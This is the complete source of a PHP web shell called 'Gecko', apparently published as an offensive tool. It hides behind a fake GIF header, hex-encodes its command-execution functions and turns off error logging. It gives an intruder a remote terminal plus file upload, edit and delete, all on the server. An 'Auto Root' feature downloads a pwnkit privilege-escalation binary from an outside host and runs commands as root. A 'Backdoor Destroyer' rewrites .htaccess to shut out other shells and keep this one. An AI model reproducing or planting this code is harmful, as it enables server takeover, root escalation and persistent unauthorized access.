<!-- GIF89;a -->
<?php

$Array = [
    '7368656c6c5f65786563',
    '65786563',
    '7061737374687275',
    '73797374656d',
    '70726f635f6f70656e',
    '706f70656e',
    '70636c6f7365',
    '72657475726e',
    '73747265616d5f6765745f636f6e74656e7473',
    '676574637764', // g e t c w d => 9 
    '6368646972', // c h d i r => 10
    '7068705f756e616d65', // p h p _ u n a m e => 11
    '6973736574',
    '66756e6374696f6e5f657869737473',
    '5f6d61645f636d64',
    '245f5345525645525b275345525645525f4e414d45275d',
    '676c6f62', // g l o b => 16
    '69735f66696c65', // i s _ f i l e => 17
    '69735f646972', // i s _ d i r => 18
    '69735f7772697461626c65', // i s _ w r i t e a b l e => 19
    '69735f7265616461626c65', // i s _ r e a d b l e => 20
    '66696c6573697a65', // f i l e _ s i z e => 21
    '6765745f63757272656e745f75736572', // user => 22
    '5345525645525f534f465457415245', // Server Software => 23
    '66696c656d74696d65', // f i l e m t i m e => 24
    '746f756368', // t o u c h => 25
    '6d6b646972', // m k d i r => 26
    '66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 27
    '66696c655f7075745f636f6e74656e7473', // f i l e p u t => 28
    '726d646972', // r m d i r => 29
    '756e6c696e6b', // u n l i n k => 30
    '66696c65', // f i l e => 31
    '6d756c7469706172742f666f726d2d64617461', // m u l t i p a r t / f o r m d a t a => 32
    '444f43554d454e545f524f4f54', // r o o t d o c => 33 
    '68747470733a2f2f7777772e6861786f726469736c616e642e746563682f6c6f63616c726f6f742f70776e6b6974' // Source maybe? => 34
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}

if (!empty($_GET['download'])) {
    $nameNyafile = basename($_GET['download']);
    $pathFilenya = $fungsi[9]() . "/" . $nameNyafile;
    if (!empty($nameNyafile) && file_exists($pathFilenya)) {

        // Define Headers
        header('Cache-control: public');
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $nameNyafile . '"');
        header('Content-Transfer-Encoding: binary');
        readfile($pathFilenya);
        exit;
    }
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Gecko [ <?= $_SERVER['HTTP_HOST']; ?> ]</title>
    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

        body {
            font-family: monospace;
            background-color: #1A1A1D;
            color: white;
        }

        a {
            text-decoration: none;
            color: white;
        }

        tr th {
            text-align: center;
            font-weight: bold;
            padding: 10px;
        }

        tr td:nth-child(3) {
            text-align: center;
        }

        tr td {
            padding: 10px;
            font-weight: bold;
        }

        thead {
            background-color: #29292e;
            color: white;
        }

        ul {
            list-style: none;
        }

        ul li {
            font-weight: bold;
        }

        h1 {
            font-family: 'Nanum Brush Script', cursive;

        }

        tbody tr:nth-child(even) {
            background: #29292e;
        }

        .pwd {
            padding: 5px;
            background-color: #29292e;
        }

        form li {
            margin: 15px;
            margin-left: -5px;
        }

        form li input[type="file"] {
            border: 1px solid;
            padding: 3.5px 4px;
            background-color: #29292e;
            color: white;
            border-radius: 5px;
        }

        .upload-submit {
            float: left;
            padding: 6.4px 50px;
            margin-right: 10px;
            font-weight: bold;
            background-color: #29292e;
            border: none;
            color: #1e9fc7;
            box-shadow: 1.5px 1.5px #303038;
            border-radius: 3px;
        }

        .upload-submit:hover {
            background-color: #d5dbd6;
            color: black;
        }

        .link-shell:hover::after {
            content: "";
            border-bottom: 2px solid white;
            display: block;
            padding-bottom: 5px;
            margin-bottom: -7px;
            animation-name: link-shell;
            animation-duration: 0.6s;
        }

        @keyframes link-shell {
            from {
                width: 0;
            }

            to {
                width: 100%;
            }
        }

        .tool-menu li {
            display: inline-block;
            font-weight: none;
            padding: 13px 7px;
        }

        .tool-menu li a {
            padding: 7px 30px;
            color: #1e9fc7;
            background-color: #29292e;
            border-radius: 3px;
            box-shadow: 1.5px 1.5px #303038;
        }

        .tool-menu li a:hover {
            background-color: #d5dbd6;
            color: black;
            box-shadow: 1.5px 1.5px #d5dbd6;
        }

        .list-tool {
            padding: 1px;
        }

        .settings {
            float: right;
            position: relative;
            margin-top: -200px;

        }

        .settings select {
            padding: 5.5px 35px;
            background-color: #303038;
            border: none;
            color: white;
            border-radius: 4px;
        }

        .select-submit {
            padding: 6.5px 50px;
            margin-right: 10px;
            background-color: #303038;
            border: none;
            color: white;
            border-radius: 4px;
        }

        .select-submit:hover {
            background-color: #d5dbd6;
            color: black;
        }

        .action-gecko:hover {
            background-color: #d5dbd6;
            color: black;
        }

        .tool-menu-header {
            margin: -13px 0px;
        }

        .create {
            background-color: rgba(0, 0, 0, 0.3);
            position: fixed;
            display: flex;
            align-items: center;
            justify-content: center;
            top: 0;
            left: 0;
            height: 100vh;
            width: 100vw;
            animation: modal-box;
            animation-duration: 0.5s;
            animation-fill-mode: both;

        }

        @keyframes modal-box {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .modal {
            border-radius: 10px;
            background-color: white;
            color: black;
            width: 600px;
            max-width: 100%;
            padding: 18px;
        }

        .modal a {
            background-color: #29292e;
            padding: 8px 15px;
            border-radius: 3px;
        }

        .modal ul {
            float: right;
        }

        .modal ul li {
            display: inline;
        }

        .btn-modal {
            background-color: #29292e;
            color: white;
            border-radius: 3px;
            padding: 8px 15px;
            border: none;
        }

        .modal input[type="text"] {
            width: 100%;
            height: 30px;
            border-radius: 3px;
            border: 1px solid black;
        }

        .fw-bold {
            font-weight: bold;
        }

        .file-size {
            color: #1e9fc7;
        }

        th {
            color: #1e9fc7;
        }

        .fa-folder {
            color: orange;
        }

        .fa-file {
            color: #1e9fc7;
        }

        .terminal-content {
            z-index: 10;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            animation: modal-box;
            animation-duration: 0.5s;
            animation-fill-mode: both;
            font-weight: bold;
        }

        .terminal-body {
            margin: auto;
            margin-top: 60px;
            z-index: 20;
            width: 90%;
            background: white;
            height: 65vh;
            color: black;
            border-radius: 5px;
        }

        .terminal-body header {
            text-align: center;
            padding: 4px;
            background: #1A1A1D;
            color: white;
        }

        .terminal-body header a {
            float: right;
            color: black;
            font-size: large;
            background-color: white;
            position: relative;
            z-index: 11;
            border-radius: 5px;
            margin-top: -45px;
            padding: 10px 30px;
        }

        .terminal-body header a:hover {
            background-color: #29292e;
            color: white;
            border: 1px solid #303038;
        }

        .output-terminal {
            width: 99.5%;
            height: 100%;
            color: black;
            background-color: white;
        }

        .terminal-input {
            width: 90%;
            padding: 6px;
            margin-left: 1px;
            border: none;
            border-bottom: 2px solid black;
        }

        .terminal-submit {
            margin: 2.5px;
            padding: 7.5px 25px;
            background-color: black;
            color: white;
            border: none;
            border-radius: 3px;
        }

        .pwd-body {
            padding: 15px 8px;
            font-weight: bold;
        }


        .border {
            border: 1px solid black;
            border-radius: 2px;
        }

        .file-box {
            position: fixed;
            width: 100%;
            height: 100vh;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }

        .file-content {
            width: 90%;
            background-color: white;
            height: 70%;
            margin: auto;
            margin-top: 20px;
            color: black;
        }

        .file-content textarea {
            width: 99.5%;
            height: 70vh;
        }

        .file-header {
            background-color: #1A1A1D;
            padding: 15px;
        }

        .file-header ul {
            list-style: none;
        }

        .file-header li {
            display: inline-block;
            margin: 0px 30px;
        }

        .file-header li:nth-child(3) {
            float: right;
            margin-right: -5px;
        }

        .file-header li:nth-child(3) a {
            color: black;
            font-size: large;
            background-color: white;
            z-index: 11;
            border-radius: 5px;
            padding: 10px 30px;
        }

        .file-header li:nth-child(3) a:hover {
            background-color: #29292e;
            color: white;
            border: 1px solid #303038;
        }

        .file-header li button {
            color: black;
            cursor: pointer;
            font-weight: bold;
            background: white;
            font-size: 15px;
            border: 1px solid white;
            padding: 10px 15px;
            margin: -10px -15px;
            border-radius: 5px;
        }

        .link-rename {
            padding: 10px 15px;
            border: 1px solid white;
            background-color: white;
            color: black;
            border-radius: 5px;
            margin: -10px -15px;
        }
    </style>
</head>
<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);


function Redirect($url, $permanent = false)
{
    header('Location: ' . $url, true, $permanent ? 301 : 302);

    exit();
}



if (isset($_GET['dir'])) {
    $cdir = unhex($_GET['dir']);
    $fungsi[10]($cdir);
} else {
    $cdir = $fungsi[9]();
}
$get_cwd = $fungsi[9]();
$scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);

?>

<body>
    <div class="list-shell">
        <ul>
            <li><?= $fungsi[11](); ?></li>
            <li><?= $_SERVER[$fungsi[23]]; ?></li>
            <li>Server IP : <?= $_SERVER['SERVER_ADDR']; ?> & Your IP : <?= $_SERVER['REMOTE_ADDR']; ?></li>
            <li>Domains : <?= symlinkDomain(); ?></li>
            <li>
                User : <?= $fungsi[22](); ?>
            </li>
            <form action="" method="post" enctype="<?= $fungsi[32] ?>">
                <li><input type="file" name="gecko-file" id=""><input type="submit" class="upload-submit" name="upload-submit" value="Upload"></li>
            </form>
        </ul>
        <div class="tool-menu-header">
            <div class="list-tool">
                <ul class="tool-menu">
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class=""><i class="fa-solid fa-code"></i>&nbsp;Auto Root</a></li>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Destroyer</a></li>
                    <li><a href="https://github.com/MadExploits/Gecko/" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
                </ul>
            </div>
        </div>
        <br>
    </div>
    <div class="border">
        <div class="pwd">
            <form action="" method="post">
                <div class="pwd-body">
                    <?php
                    $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
                    $pwd = explode("/", $cwd);
                    foreach ($pwd as $id => $val) {
                        if ($val == '' && $id == 0) {
                            echo '<a href="?dir=' . hex('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                            continue;
                        }
                        if ($val == '') continue;
                        echo '<a href="?dir=';
                        for ($i = 0; $i <= $id; $i++) {
                            echo hex($pwd[$i]);
                            if ($i != $id) echo hex("/");
                        }
                        echo '">' . $val . ' / ' . '</a>';
                    }
                    ?>
                </div>
                <div class="settings">
                    <select name="action-gecko" id="" class="action-gecko">
                        <option value="delete">Delete</option>
                        <option value="unzip">Unzip</option>
                    </select>
                    <input type="submit" class="select-submit" value="Submit" name="gecko-submit">
                </div>
        </div>
        <table style="width:100%;">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Date</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <!-- FOLDER NYA -->
                <?php foreach ($scdir as $dir) : ?>
                    <?php if ($fungsi[18]($dir)) : ?>
                        <tr>
                            <td>
                                <input type="checkbox" name="check-gecko[]" id="folder" value="<?= $dir; ?>">&nbsp;<label for="folder"><i class="fa-solid fa-folder"></i>&nbsp;<a href="?dir=<?= hex($cwd . "/" . $dir); ?>" class="link-shell"><?= $dir; ?></a>
                            </td>
                            <td>[ DIR ]</td>
                            <td><?php if ($fungsi[19]($fungsi[9]() . '/' . $dir)) echo '<font color="#00ff00">';
                                elseif (!$fungsi[20]($fungsi[9]() . '/' . $dir)) echo '<font color="red">';
                                echo perms($fungsi[9]() . '/' . $dir);
                                ?>
                            </td>
                            <td>
                                <?php echo date(
                                    "Y-m-d H:i",
                                    $fungsi[24]($dir)
                                ); ?>
                            </td>
                            <td>
                                <a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $dir ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $dir ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
                            </td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
                <!-- FILE NYA -->
                <?php foreach ($scdir as $_file) : ?>
                    <?php if ($fungsi[17]($_file)) : ?>
                        <tr>
                            <td>
                                <input type="checkbox" name="check-gecko[]" id="folder" value="<?= $_file; ?>">&nbsp;<label for="folder"><i class="fa-regular fa-file"></i>&nbsp;<a href="?dir=<?= hex($cwd . "/"); ?>&f=<?= $_file; ?>" class="link-shell"><?= $_file; ?></a>
                            </td>
                            <td><?= formatSize($fungsi[21]($_file)); ?></td>
                            <td>
                                <?php if ($fungsi[19]($fungsi[9]() . '/' . $_file)) {
                                    echo '<font color="#00ff00">';
                                } elseif (!$fungsi[20]($fungsi[9]() . '/' . $_file)) {
                                    echo '<font color="red">';
                                }
                                echo perms($fungsi[9]() . '/' . $_file);
                                ?>
                            </td>
                            <td>
                                <?php echo date(
                                    "Y-m-d H:i",
                                    $fungsi[24]($_file)
                                ); ?>
                            </td>
                            <td>
                                <a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_file ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&download=<?= $_file ?>"><i class="fa-solid fa-download"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $_file ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
                            </td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <br>
    </form>
    <?php
    if ($_GET['create'] == True) :
    ?>
        <div class="create">
            <div class="modal">
                <?php if ($_GET['create'] == "file") :  ?>
                    <header>
                        <h2><?= '<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File'; ?></h2>
                    </header>
                    <form action="" method="post">
                        <input type="text" name="create_file" id="" placeholder="&nbsp;Nama File">
                    <?php elseif ($_GET['create'] == "folder") : ?>
                        <header>
                            <h2><?= '<i class="fa-solid fa-folder-plus">&nbsp;</i>Create Folder'; ?></h2>
                        </header>
                        <form action="" method="post">
                            <input type="text" name="create_folder" id="" placeholder="&nbsp;Nama Folder">
                        <?php endif; ?>
                        <ul>
                            <li><input type="submit" name="submit-modal" class="btn-modal fw-bold" value="Submit"></li>
                            <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
                        </ul>
                        </form>
            </div>
        </div>
    <?php endif; ?>
    <?php
    if ($_GET['action'] == "terminal") :
    ?>
        <div class="terminal-content">
            <div class="terminal">
                <div class="terminal-body">
                    <header>
                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
                    </header>
                    <form action="" method="post">
                        <center>
                            <input type="text" placeholder="uname -a" name="terminal" class="terminal-input" autofocus>
                            <input type="submit" value=">" name="submit-terminal" class="terminal-submit">
                        </center>
                    </form>
                    <?php if (isset($_POST['submit-terminal'])) :  ?>
                        <textarea class="output-terminal" disabled><?= htmlspecialchars($fungsi[14]($_POST['terminal'] . " 2>&1")); ?></textarea>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['action'] == "root-terminal") : ?>
        <div class="terminal-content">
            <div class="terminal">
                <div class="terminal-body">
                    <header>
                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
                    </header>
                    <form action="" method="post">
                        <center>
                            <input type="text" placeholder="root@terminal~#" name="terminal-root" class="terminal-input" autofocus>
                            <input type="submit" value=">" name="submit-root" class="terminal-submit">
                        </center>
                    </form>
                    <?php if (isset($_POST['submit-root'])) :  ?>
                        <textarea class="output-terminal" disabled>
<?php
                        $terminal = $_POST['terminal-root'];
                        if ($terminal == "root") {
                            echo "[+] Downloading The source \n";
                            echo $fungsi[14]("wget " . $fungsi[34] . " --no-check-certificate");
                            echo "[!] Chmod file pwnkit....\n";
                            echo $fungsi[14]("chmod +x pwnkit");
                            echo "[+] Testing if this kernel vulnerable...\n";
                            echo $fungsi[14]('./pwnkit "id" >> mad-pwnkit');
                            $check_vulnerable = $fungsi[27]($fungsi[9]() . "/mad-pwnkit");
                            $explode_mad_pwkit = explode(" ", $check_vulnerable);
                            if ($explode_mad_pwkit[0] == "uid=0(root)") {
                                echo "[~] This Kernel is vulnerable congrats!\n";
                            } else {
                                echo "[!] This kernel is not Vulnerable Sorry :)";
                                return;
                            }
                            echo "[+] Giving Permission on mad-pwnkit\n";
                            echo $fungsi[14]("chmod +x mad-pwnkit");
                            if (!$fungsi[14]('./pwnkit "id"')) {
                                echo "[!] Cannot running pwnkit";
                            } else {
                                echo "[!] Done Sir. now u can running on root user!";
                                exit;
                            }
                        }
                        echo htmlspecialchars($fungsi[14]('./pwnkit "' . $terminal . '"'));
?>
                        </textarea>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php
    if (isset($_POST['submit-modal'])) {
        if ($_POST['create_file']) {
            $file = $_POST['create_file'];
            if ($fungsi[25]($file)) {
                echo success();
            } else {
                echo failed();
            }
        } elseif ($_POST['create_folder']) {
            $folder = $_POST['create_folder'];
            if ($fungsi[26]($folder)) {
                echo success();
            } else {
                echo failed();
            }
        }
    } ?>
    <br>
    <?php
    if (isset($_GET['f'])) :
    ?>
        <div class="file-box">
            <div class="file-content">
                <form action="" method="post">
                    <div class="file-header">
                        <ul>
                            <li><button type="submit" name="submit-file"><i class="fa-regular fa-floppy-disk"></i>&nbsp;Save</button></li>
                            <li><a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_GET['f'] ?>" class="link-rename"><i class="fa-solid fa-pen-to-square"></i>&nbsp;Rename</a></li>
                            <li> <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a></li>
                        </ul>
                    </div>
                    <textarea name="text-file"><?php echo htmlspecialchars($fungsi[27]($_GET['f'])); ?></textarea>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['rename'] == True) : ?>
        <div class="create">
            <div class="modal">
                <header>
                    <h2><?= $_GET['rename'] ?></h2>
                </header>
                <form action="" method="post">
                    <input type="text" name="rename" id="" placeholder="&nbsp;File/Folder">
                    <ul>
                        <li><input type="submit" name="submit-rename" class="btn-modal fw-bold" value="Submit"></li>
                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
                    </ul>
                </form>
            </div>
        </div>

    <?php endif; ?>
    <?php if ($_GET['chmod'] == True) : ?>
        <div class="create">
            <div class="modal">
                <header>
                    <h2><?= $_GET['chmod'] ?></h2>
                </header>
                <form action="" method="post">
                    <input type="number" style="width:100%" name="chmod" id="" placeholder="&nbsp;775">
                    <ul>
                        <li><input type="submit" name="submit-chmod" class="btn-modal fw-bold" value="Submit"></li>
                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
                    </ul>
                </form>
            </div>
        </div>
    <?php endif; ?>
</body>

</html>

<?php

if ($_GET['backdoor'] == True) {
    // check if htaccess have this code
    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
    $cari_code = explode('<', $file_htaccess);
    if (!end($cari_code) == '/FilesMatch>') {
        // pengecekan nama file sekarang
        $namafile = $_SERVER['SCRIPT_FILENAME'];
        $fileUtama = explode("/", $namafile);
        $htaccess_text = '
<FilesMatch ".ph*|Ph*|pH*|PH*">
    Order Deny,Allow
    Deny from all
</FilesMatch>
<FilesMatch "' . end($fileUtama) . '|index.php|index.html|*.png|.htaccess">
    Order Deny, Allow
    Allow from all
</FilesMatch>';
        $document_root = $_SERVER[$fungsi[33]];
        $cmd = $fungsi[14]("echo '" . $htaccess_text . "' >> " . $document_root . "/.htaccess");
        if ($cmd) {
            echo success();
        } else {
            echo failed();
        }
    } else {
        echo failed();
    }
}

if (isset($_POST['submit-chmod'])) {
    $numberChmod = $_POST['chmod'];
    $chm_o_d = chmod($fungsi[9] . "/" . $_GET['chmod'], is_int($numberChmod));
    if ($chm_o_d) {
        echo success();
    } else {
        echo failed();
    }
}

if (isset($_POST['upload-submit'])) {
    $name_file = $_FILES['gecko-file']['name'];
    $tmp_name = $_FILES['gecko-file']['tmp_name'];
    $move = move_uploaded_file($tmp_name, __DIR__ . "/" . $name_file);
    if ($move) {
        echo success();
    } else {
        echo failed();
    }
}

if (isset($_POST['submit-rename'])) {
    $new_name = $_POST['rename'];
    $re_name = rename($fungsi[9]() . "/" . $_GET['rename'], $new_name);
    if ($re_name) {
        echo success();
    } else {
        echo failed();
    }
}

if (isset($_POST['submit-file'])) {
    $textarea = $_POST['text-file'];
    $write = $fungsi[28]($fungsi[9]() . "/" . $_GET['f'], $textarea);
    if ($write) {
        echo success();
    } else {
        echo failed();
    }
}



if (isset($_POST['gecko-submit'])) {
    $item = $_POST['check-gecko'];
    if ($_POST['action-gecko'] == "delete") {
        foreach ($item as $it) {
            $repl = str_replace("\\", "/", $fungsi[9]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[18]($fd) || $fungsi[17]($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[30]($fd);
                if ($rmdir || $rmfile) {
                    echo success();
                } else {
                    echo failed();
                }
            }
        }
    }
}

function success()
{
    return '<meta http-equiv="refresh" content="0;url=?dir=' . hex($GLOBALS['fungsi'][9]()) . '&response=success">';
}
function failed()
{
    return '<meta http-equiv="refresh" content="0;url=?dir=' . hex($GLOBALS['fungsi'][9]()) . '&response=failed">';
}

function _mad_cmd($de)
{
    $out = '';
    try {
        if (function_exists('shell_exec')) {
            return @$GLOBALS['fungsi'][0]($de);
        } else if (function_exists('system')) {
            @$GLOBALS['fungsi'][3]($de);
        } else if (function_exists('exec')) {
            $exec = array();
            @$GLOBALS['fungsi'][1]($de, $exec);
            $out = @join("\n", $exec);
            return $exec;
        } else if (function_exists('passthru')) {
            @$GLOBALS['fungsi'][2]($de);
        } else if (function_exists('popen') && function_exists('pclose')) {
            if (is_resource($f = @$GLOBALS['fungsi'][5]($de, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                return $out;
                $GLOBALS['fungsi'][6]($f);
            }
        } else if (function_exists('proc_open')) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][4]($de . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][8]($pipes[1]);
            return $out;
        } else if (class_exists('COM')) {
            $madWs = new COM('WScript.shell');
            $exec = $madWs->$GLOBALS['fungsi'][1]('cmd.exe /c ' . $_POST['alfa1']);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}



function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][18]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][30]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][29]($dir);
    }
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}

function symlinkDomain()
{
    $d0mains = @file("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function linux_version()
{
    $pecah = explode(" ", $GLOBALS['fungsi'][11]());
    $pcah = explode("-", $pecah[2]);
    return $pcah[0];
}

function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unhex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
?>
